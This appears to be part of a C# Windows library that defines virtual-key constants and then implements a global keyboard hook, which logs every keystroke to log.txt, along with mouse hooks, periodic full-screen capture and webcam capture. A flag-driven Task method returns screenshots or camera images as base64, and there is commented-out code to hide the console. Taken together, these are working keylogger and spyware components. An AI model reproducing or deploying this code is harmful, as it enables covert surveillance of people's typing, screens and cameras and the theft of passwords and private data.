        public const int VK_NEXT = 0x22;// PAGE DOWN key
        public const int VK_END = 0x23;// END key
        public const int VK_HOME = 0x24;// HOME key
        public const int VK_LEFT = 0x25;// LEFT ARROW key
        public const int VK_UP = 0x26;// UP ARROW key
        public const int VK_RIGHT = 0x27;// RIGHT ARROW key
        public const int VK_DOWN = 0x28;// DOWN ARROW key
        public const int VK_SELECT = 0x29;// SELECT key
        public const int VK_PRINT = 0x2A;// PRINT key
        public const int VK_EXECUTE = 0x2B;// EXECUTE key
        public const int VK_SNAPSHOT = 0x2C;// PRINT SCREEN key
        public const int VK_INSERT = 0x2D;// INS key
        public const int VK_DELETE = 0x2E;// DEL key
        public const int VK_HELP = 0x2F;// HELP key

        public const int VK_0 = 0x30;
        public const int VK_1 = 0x31;
        public const int VK_2 = 0x32;
        public const int VK_3 = 0x33;
        public const int VK_4 = 0x34;
        public const int VK_5 = 0x35;
        public const int VK_6 = 0x36;
        public const int VK_7 = 0x37;
        public const int VK_8 = 0x38;
        public const int VK_9 = 0x39;
        public const int VK_A = 0x41;
        public const int VK_B = 0x42;
        public const int VK_C = 0x43;
        public const int VK_D = 0x44;
        public const int VK_E = 0x45;
        public const int VK_F = 0x46;
        public const int VK_G = 0x47;
        public const int VK_H = 0x48;
        public const int VK_I = 0x49;
        public const int VK_J = 0x4A;
        public const int VK_K = 0x4B;
        public const int VK_L = 0x4C;
        public const int VK_M = 0x4D;
        public const int VK_N = 0x4E;
        public const int VK_O = 0x4F;
        public const int VK_P = 0x50;
        public const int VK_Q = 0x51;
        public const int VK_R = 0x52;
        public const int VK_S = 0x53;
        public const int VK_T = 0x54;
        public const int VK_U = 0x55;
        public const int VK_V = 0x56;
        public const int VK_W = 0x57;
        public const int VK_X = 0x58;
        public const int VK_Y = 0x59;
        public const int VK_Z = 0x5A;

        public const int VK_LWIN = 0x5B;// Left Windows key (Microsoft Natural keyboard)

        public const int VK_RWIN = 0x5C;// Right Windows key (Natural keyboard)

        public const int VK_APPS = 0x5D;// Applications key (Natural keyboard)

        public const int VK_SLEEP = 0x5F;// Computer Sleep key


        public const int VK_NUMPAD0 = 0x60;
        public const int VK_NUMPAD1 = 0x61;
        public const int VK_NUMPAD2 = 0x62;
        public const int VK_NUMPAD3 = 0x63;
        public const int VK_NUMPAD4 = 0x64;
        public const int VK_NUMPAD5 = 0x65;
        public const int VK_NUMPAD6 = 0x66;
        public const int VK_NUMPAD7 = 0x67;
        public const int VK_NUMPAD8 = 0x68;
        public const int VK_NUMPAD9 = 0x69;
        public const int VK_MULTIPLY = 0x6A;
        public const int VK_ADD = 0x6B;
        public const int VK_SEPARATOR = 0x6C;
        public const int VK_SUBTRACT = 0x6D;
        public const int VK_DECIMAL = 0x6E;
        public const int VK_DIVIDE = 0x6F;

        public const int VK_F1 = 0x70;
        public const int VK_F2 = 0x71;
        public const int VK_F3 = 0x72;
        public const int VK_F4 = 0x73;
        public const int VK_F5 = 0x74;
        public const int VK_F6 = 0x75;
        public const int VK_F7 = 0x76;
        public const int VK_F8 = 0x77;
        public const int VK_F9 = 0x78;
        public const int VK_F10 = 0x79;
        public const int VK_F11 = 0x7A;
        public const int VK_F12 = 0x7B;
        public const int VK_F13 = 0x7C;
        public const int VK_F14 = 0x7D;
        public const int VK_F15 = 0x7E;
        public const int VK_F16 = 0x7F;
        public const int VK_F17 = 0x80;
        public const int VK_F18 = 0x81;
        public const int VK_F19 = 0x82;
        public const int VK_F20 = 0x83;
        public const int VK_F21 = 0x84;
        public const int VK_F22 = 0x85;
        public const int VK_F23 = 0x86;
        public const int VK_F24 = 0x87;

        public const int VK_NUMLOCK = 0x90;
        public const int VK_SCROLL = 0x91;
        public const int VK_LSHIFT = 0xA0;
        public const int VK_RSHIFT = 0xA1;
        public const int VK_LCONTROL = 0xA2;
        public const int VK_RCONTROL = 0xA3;
        public const int VK_LMENU = 0xA4;
        public const int VK_RMENU = 0xA5;

        public const int VK_BROWSER_BACK = 0xA6;// Windows 2000/XP: Browser Back key
        public const int VK_BROWSER_FORWARD = 0xA7;// Windows 2000/XP: Browser Forward key
        public const int VK_BROWSER_REFRESH = 0xA8;// Windows 2000/XP: Browser Refresh key
        public const int VK_BROWSER_STOP = 0xA9;// Windows 2000/XP: Browser Stop key
        public const int VK_BROWSER_SEARCH = 0xAA;// Windows 2000/XP: Browser Search key
        public const int VK_BROWSER_FAVORITES = 0xAB;// Windows 2000/XP: Browser Favorites key
        public const int VK_BROWSER_HOME = 0xAC;// Windows 2000/XP: Browser Start and Home key
        public const int VK_VOLUME_MUTE = 0xAD;// Windows 2000/XP: Volume Mute key
        public const int VK_VOLUME_DOWN = 0xAE;// Windows 2000/XP: Volume Down key
        public const int VK_VOLUME_UP = 0xAF;// Windows 2000/XP: Volume Up key
        public const int VK_MEDIA_NEXT_TRACK = 0xB0;// Windows 2000/XP: Next Track key
        public const int VK_MEDIA_PREV_TRACK = 0xB1;// Windows 2000/XP: Previous Track key
        public const int VK_MEDIA_STOP = 0xB2;// Windows 2000/XP: Stop Media key
        public const int VK_MEDIA_PLAY_PAUSE = 0xB3;// Windows 2000/XP: Play/Pause Media key
        public const int VK_MEDIA_LAUNCH_MAIL = 0xB4;// Windows 2000/XP: Start Mail key
        public const int VK_MEDIA_LAUNCH_MEDIA_SELECT = 0xB5;// Windows 2000/XP: Select Media key
        public const int VK_MEDIA_LAUNCH_APP1 = 0xB6;// VK_LAUNCH_APP1 (B6) Windows 2000/XP: Start Application 1 key
        public const int VK_MEDIA_LAUNCH_APP2 = 0xB7;// VK_LAUNCH_APP2 (B7) Windows 2000/XP: Start Application 2 key

        public const int VK_OEM_1 = 0xBA;

        public const int VK_OEM_PLUS = 0xBB;

        public const int VK_OEM_COMMA = 0xBC;

        public const int VK_OEM_MINUS = 0xBD;

        public const int VK_OEM_PERIOD = 0xBE;

        public const int VK_OEM_2 = 0xBF;

        public const int VK_OEM_3 = 0xC0;

        public const int VK_OEM_4 = 0xDB;

        public const int VK_OEM_5 = 0xDC;

        public const int VK_OEM_6 = 0xDD;

        public const int VK_OEM_7 = 0xDE;

        public const int VK_OEM_8 = 0xDF;

        public const int VK_OEM_102 = 0xE2;

        public const int VK_PROCESSKEY = 0xE5;

        public const int VK_PACKET = 0xE7;

        public const int VK_ATTN = 0xF6;// Attn key
        public const int VK_CRSEL = 0xF7;// CrSel key
        public const int VK_EXSEL = 0xF8;// ExSel key
        public const int VK_EREOF = 0xF9;// Erase EOF key
        public const int VK_PLAY = 0xFA;// Play key
        public const int VK_ZOOM = 0xFB;// Zoom key

        public const int VK_NONAME = 0xFC;// Reserved for future use

        public const int VK_PA1 = 0xFD;// VK_PA1 (FD) PA1 key

        public const int VK_OEM_CLEAR = 0xFE;// Clear key
        #endregion
        private static string m_tempLog = "";
        private static string m_log = "";
        public static string Log
        {
            get { return m_log; }
            set { m_log = value; }
        }
        public static string PastLog
        {
            get { return m_tempLog; }
            set { m_tempLog = value; }
        }
        public static string _LogPath = Application.StartupPath + @"\log.txt";
        private const int WH_KEYBOARD_LL = 13;
        public const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        public static IntPtr _hookID = IntPtr.Zero;
        public static void SendKeysToFocused(string keys)
        {
            SendKeys.Send(keys);
        }
        public static void SendGlobalKey(Keys key)
        {
            keybd_event(Convert.ToByte(key), 0, KEYEVENTF_EXTENDEDKEY, 0);
            keybd_event(Convert.ToByte(key), 0, KEYEVENTF_KEYUP, 0);
        }
        public static void Start(string Logpath = null)
        {
            if (Logpath != null)
            {
                _LogPath = Logpath;
            }
            //var handle = GetConsoleWindow();

            // Hide
            //ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);


        }
        public static IntPtr StartCustom(LowLevelKeyboardProc action, string Logpath = null)
        {
            if (Logpath != null)
            {
                _LogPath = Logpath;
            }
            return _hookID = SetHook(action);
        }
        public static void Stop()
        {
            UnhookWindowsHookEx(_hookID);
        }
        public static bool StopCustom(IntPtr hookId)
        {
            return UnhookWindowsHookEx(hookId);
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (m_log.Length < 30000)
                    m_log += (Keys)vkCode;
                else
                {

                    m_tempLog = m_log;
                    StreamWriter sw = new StreamWriter(_LogPath, true);
                    sw.Write(m_log);
                    sw.Close();
                    m_log = "";
                    m_log += (Keys)vkCode;
                }
                //Console.WriteLine((Keys)vkCode);
                //StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                //sw.Write((Keys)vkCode);
                //sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo); //UIntPtr

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

    }
    public class Mouse
    {
        private static string m_tempLog = "";
        private static string m_log = "";
        public static string Log
        {
            get { return m_log; }
            set { m_log = value; }
        }
        public static string PastLog
        {
            get { return m_tempLog; }
            set { m_tempLog = value; }
        }
        public static string _LogPath = Application.StartupPath + @"\log.txt";
        private static LowLevelMouseProc _proc = HookCallback;

        public static IntPtr _hookID = IntPtr.Zero;

        public static void Start(string logpath = null)
        {
            if (logpath != null)
                _LogPath = logpath;
            _hookID = SetHook(_proc);

        }
        public static IntPtr StartCustom(LowLevelMouseProc action, string logpath = null)
        {
            if (logpath != null)
                _LogPath = logpath;
            return _hookID = SetHook(action);
        }

        public static void Stop()
        {
            UnhookWindowsHookEx(_hookID);
        }
        public static bool StopCustom(IntPtr hookId)
        {
            return UnhookWindowsHookEx(hookId);
        }
        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int X, int Y);
        private static void SetFunnyPosition(POINT point, int offset = 50)
        {
            SetCursorPos(point.x - offset, point.y - offset);
        }
        public static void SetPosition(int x, int y)
        {
            SetCursorPos(x, y);
        }
        private static IntPtr SetHook(LowLevelMouseProc proc)

        {

            using (Process curProcess = Process.GetCurrentProcess())

            using (ProcessModule curModule = curProcess.MainModule)

            {

                return SetWindowsHookEx(WH_MOUSE_LL, proc,

                    GetModuleHandle(curModule.ModuleName), 0);

            }

        }


        public delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);


        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (nCode >= 0 &&

                MouseMessages.WM_LBUTTONDOWN == (MouseMessages)wParam)

            {

                MSLLHOOKSTRUCT hookStruct = (MSLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(MSLLHOOKSTRUCT));

                Console.WriteLine(hookStruct.pt.x + ", " + hookStruct.pt.y);


            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);

        }


        private const int WH_MOUSE_LL = 14;


        public enum MouseMessages

        {

            WM_LBUTTONDOWN = 0x0201,

            WM_LBUTTONUP = 0x0202,

            WM_MOUSEMOVE = 0x0200,

            WM_MOUSEWHEEL = 0x020A,

            WM_RBUTTONDOWN = 0x0204,

            WM_RBUTTONUP = 0x0205

        }

        [Serializable]
        [StructLayout(LayoutKind.Sequential)]

        public struct POINT

        {

            public int x;

            public int y;

        }

        [Serializable]
        [StructLayout(LayoutKind.Sequential)]

        public struct MSLLHOOKSTRUCT

        {

            public POINT pt;

            public uint mouseData;

            public uint flags;

            public uint time;

            public IntPtr dwExtraInfo;

        }


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        private static extern IntPtr SetWindowsHookEx(int idHook,

            LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        [return: MarshalAs(UnmanagedType.Bool)]

        private static extern bool UnhookWindowsHookEx(IntPtr hhk);


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,

            IntPtr wParam, IntPtr lParam);


        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        private static extern IntPtr GetModuleHandle(string lpModuleName);
        public class MouseOperations
        {
            [Flags]
            public enum MouseEventFlags
            {
                LeftDown = 0x00000002,
                LeftUp = 0x00000004,
                MiddleDown = 0x00000020,
                MiddleUp = 0x00000040,
                Move = 0x00000001,
                Absolute = 0x00008000,
                RightDown = 0x00000008,
                RightUp = 0x00000010
            }

            [DllImport("user32.dll", EntryPoint = "SetCursorPos")]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool SetCursorPos(int X, int Y);

            [DllImport("user32.dll")]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool GetCursorPos(out MousePoint lpMousePoint);

            [DllImport("user32.dll")]
            private static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

            public static void SetCursorPosition(int X, int Y)
            {
                SetCursorPos(X, Y);
            }

            public static void SetCursorPosition(MousePoint point)
            {
                SetCursorPos(point.X, point.Y);
            }

            public static MousePoint GetCursorPosition()
            {
                MousePoint currentMousePoint;
                var gotPoint = GetCursorPos(out currentMousePoint);
                if (!gotPoint) { currentMousePoint = new MousePoint(0, 0); }
                return currentMousePoint;
            }

            public static void MouseEvent(MouseEventFlags value)
            {
                MousePoint position = GetCursorPosition();

                mouse_event
                    ((int)value,
                     position.X,
                     position.Y,
                     0,
                     0)
                    ;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct MousePoint
            {
                public int X;
                public int Y;

                public MousePoint(int x, int y)
                {
                    X = x;
                    Y = y;
                }

            }

        }
    }
    public class Screen
    {
        protected virtual void FireImageCaptured(ImageEvent obj)
        {
            EventHandler<ImageEvent> handler = ImageCaptured;
            if (handler != null)
            {
                handler(this, obj);
            }
        }
        public class ImageEvent : EventArgs
        {
            public ImageEvent(Image obj = null)
            {
                if (obj != null)
                {
                    Data = obj;
                }
            }
            public Image Data { get; set; }
        }
        public event EventHandler<ImageEvent> ImageCaptured;

        public static readonly object _Lock = new object();
        public static readonly object _KillLock = new object();
        private static bool _KillThread = false;
        private static ScreenGrabber _Grabber;
        private System.Threading.Timer t;
        private static Image m_image;

        public Screen()
        {

        }
        public Screen(EventHandler<ImageEvent> handler)
        {
            ImageCaptured += handler;
        }
        public static Image Image
        {
            get
            {
                lock (_Lock)
                {
                    return m_image;
                }
            }
        }
        public void StartScreenCapture(int frequency = 1000, bool wait = false)
        {
            _Grabber = new ScreenGrabber();
            var AutoEvent = new AutoResetEvent(false);
            t = new System.Threading.Timer(Scr_Cap_Tick, AutoEvent, 0, frequency);
            if (wait)
                AutoEvent.WaitOne();
        }
        public void StopScreenCapture()
        {
            lock (_KillLock)
            {
                _KillThread = true;
            }
        }
        public void Scr_Cap_Tick(object state)
        {
            try
            {
                lock (_Lock)
                {
                    m_image = _Grabber.CaptureScreen();
                    FireImageCaptured(new ImageEvent(m_image));
                    GC.Collect();
                }
                var Reset = (AutoResetEvent)state;
                //lock (_KillLock)
                //{
                //   if (_KillThread)
                //      Reset?.Set();
                // }
            }
            catch { }
        }
    }
    public class ScreenGrabber
    {
        private string FLAG;
        private string ARG;
        private string str64;
        public ScreenGrabber()
        {
            str64 = null;
            FLAG = "scr";
            ARG = null;
        }
        public string Task(string flag)
        {
            if (flag.Equals("scr"))
            {
                str64 = Convert.ToBase64String(ImageToByteArray(getVirtualScreenshot()));
            }
            else if (flag.Equals("cam"))
            {
                str64 = Convert.ToBase64String(ImageToByteArray(CameraCapture(ARG)));
            }
            return str64;
        }
        public Image CaptureScreen()
        {
            var raw = getVirtualScreenshot();
            Image compressed = null;
            using (MemoryStream stream = new MemoryStream())
            {
                raw.Save(stream, ImageFormat.Png);
                compressed = Image.FromStream(stream);
            }
            return compressed;
        }
        public Image CaptureCamera(string parameter)
        {
            return CameraCapture(parameter);
        }
        public string CaptureScreenBase64()
        {
            return Convert.ToBase64String(ImageToByteArray(getVirtualScreenshot()));
        }
        public string CaptureCameraBase64(string parameter)
        {
            return Convert.ToBase64String(ImageToByteArray(CameraCapture(parameter)));
        }
        public byte[] ImageToByteArray(Image img)
        {
            byte[] byteArray = new byte[0];
            using (MemoryStream stream = new MemoryStream())
            {
                img.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
                stream.Close();

                byteArray = stream.ToArray();
            }
            return byteArray;
        }
        private Image getVirtualScreenshot()
        {

            Image screenshot = new Bitmap(SystemInformation.VirtualScreen.Width,
                               SystemInformation.VirtualScreen.Height,
                               PixelFormat.Format32bppArgb);
            Graphics screenGraph = Graphics.FromImage(screenshot);

            screenGraph.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                       SystemInformation.VirtualScreen.Y,
                                       0,
                                       0,
                                       SystemInformation.VirtualScreen.Size,
                                       CopyPixelOperation.SourceCopy);

            return screenshot;

            //screenshot.Save("Screenshot.png", System.Drawing.Imaging.ImageFormat.Png);            
        }
        private Image CameraCapture(string arg)
        {
            PictureBox pb = new PictureBox();
            Image image = null;
            CameraGrabber camera;

            camera = new CameraGrabber();
            camera.Load();
            ArrayList devices = camera.ListOfDevices;
            //check against arg to select device      
            camera.Container = pb;
            camera.OpenConnection();
            image = camera.SaveImage();
            //image = pb.Image; //also accessble from the pb
            camera.Dispose();
            //pb.Dispose();
            return image;
        }
    }
    public class CameraGrabber : IDisposable
    {
        /* Those contants are used to overload the unmanaged code functions
         * each constant represent a state*/

        private const short WM_CAP = 0x400;
        private const int WM_CAP_DRIVER_CONNECT = 0x40a;
        private const int WM_CAP_DRIVER_DISCONNECT = 0x40b;
        private const int WM_CAP_EDIT_COPY = 0x41e;
        private const int WM_CAP_SET_PREVIEW = 0x432;
        private const int WM_CAP_SET_OVERLAY = 0x433;
        private const int WM_CAP_SET_PREVIEWRATE = 0x434;
        private const int WM_CAP_SET_SCALE = 0x435;
        private const int WS_CHILD = 0x40000000;
        private const int WS_VISIBLE = 0x10000000;
        private const short SWP_NOMOVE = 0x2;
        private short SWP_NOZORDER = 0x4;
        private short HWND_BOTTOM = 1;

        //This function enables enumerate the web cam devices
        [DllImport("avicap32.dll")]
        protected static extern bool capGetDriverDescriptionA(short wDriverIndex,
            [MarshalAs(UnmanagedType.VBByRefStr)]ref String lpszName,
           int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref String lpszVer, int cbVer);

        //This function enables create a  window child with so that you can display it in a picturebox for example
        [DllImport("avicap32.dll")]
        protected static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string
    lpszWindowName,
            int dwStyle, int x, int y, int nWidth, int nHeight, int hWndParent, int nID);

        //This function enables set changes to the size, position, and Z order of a child window
        [DllImport("user32")]
        protected static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);

        //This function enables send the specified message to a window or windows
        [DllImport("user32", EntryPoint = "SendMessageA")]
        protected static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object
    lParam);

        //This function enable destroy the window child 
        [DllImport("user32")]
        protected static extern bool DestroyWindow(int hwnd);

        // Normal device ID
        int DeviceID = 0;
        // Handle value to preview window
        int hHwnd = 0;
        //The devices list
        public ArrayList ListOfDevices = new ArrayList();

        //The picture to be displayed
        public PictureBox Container { get; set; }

        // Connect to the device.
        /// <summary>
        /// This function is used to load the list of the devices 
        /// </summary>
        public void Load()
        {
            string Name = String.Empty.PadRight(100);
            string Version = String.Empty.PadRight(100);
            bool EndOfDeviceList = false;
            short index = 0;

            // Load name of all avialable devices into the lstDevices .
            do
            {
                // Get Driver name and version
                EndOfDeviceList = capGetDriverDescriptionA(index, ref Name, 100, ref Version, 100);
                // If there was a device add device name to the list
                if (EndOfDeviceList) ListOfDevices.Add(Name.Trim());
                index += 1;
            }
            while (!(EndOfDeviceList == false));
        }

        /// <summary>
        /// Function used to display the output from a video capture device, you need to create 
        /// a capture window.
        /// </summary>
        public void OpenConnection()
        {
            string DeviceIndex = Convert.ToString(DeviceID);
            IntPtr oHandle = Container.Handle;

            //{
            //  MessageBox.Show("You should set the container property");
            //}

            // Open Preview window in picturebox .
            // Create a child window with capCreateCaptureWindowA so you can display it in a picturebox.

            hHwnd = capCreateCaptureWindowA(ref DeviceIndex, WS_VISIBLE | WS_CHILD, 0, 0, 640, 480, oHandle.ToInt32(), 0);

            // Connect to device
            if (SendMessage(hHwnd, WM_CAP_DRIVER_CONNECT, DeviceID, 0) != 0)
            {
                // Set the preview scale
                SendMessage(hHwnd, WM_CAP_SET_SCALE, -1, 0);
                // Set the preview rate in terms of milliseconds
                SendMessage(hHwnd, WM_CAP_SET_PREVIEWRATE, 66, 0);
                // Start previewing the image from the camera
                SendMessage(hHwnd, WM_CAP_SET_PREVIEW, -1, 0);
                // Resize window to fit in picturebox
                SetWindowPos(hHwnd, HWND_BOTTOM, 0, 0, Container.Height, Container.Width, SWP_NOMOVE | SWP_NOZORDER);

            }
            else
            {
                // Error connecting to device close window
                DestroyWindow(hHwnd);
            }
        }
        //Close windows
        void CloseConnection()

        {
            SendMessage(hHwnd, WM_CAP_DRIVER_DISCONNECT, DeviceID, 0);
            // close window
            DestroyWindow(hHwnd);
        }

        //Save image

        public Image SaveImage()
        {
            IDataObject data;
            Image oImage = null;
            SaveFileDialog sfdImage = new SaveFileDialog();
            sfdImage.Filter = "(*.bmp)|*.bmp";
            // Copy image to clipboard
            SendMessage(hHwnd, WM_CAP_EDIT_COPY, 0, 0);

            // Get image from clipboard and convert it to a bitmap
            data = Clipboard.GetDataObject();
            if (data.GetDataPresent(typeof(System.Drawing.Bitmap)))
            {
                oImage = (Image)data.GetData(typeof(System.Drawing.Bitmap));
                CloseConnection();
                return oImage;
            }
            return oImage;
        }

        /// <summary>
        /// This function is used to dispose the connection to the device
        /// </summary>
        #region IDisposable Members

        public void Dispose()

        {
            CloseConnection();
        }
        #endregion
    }
}
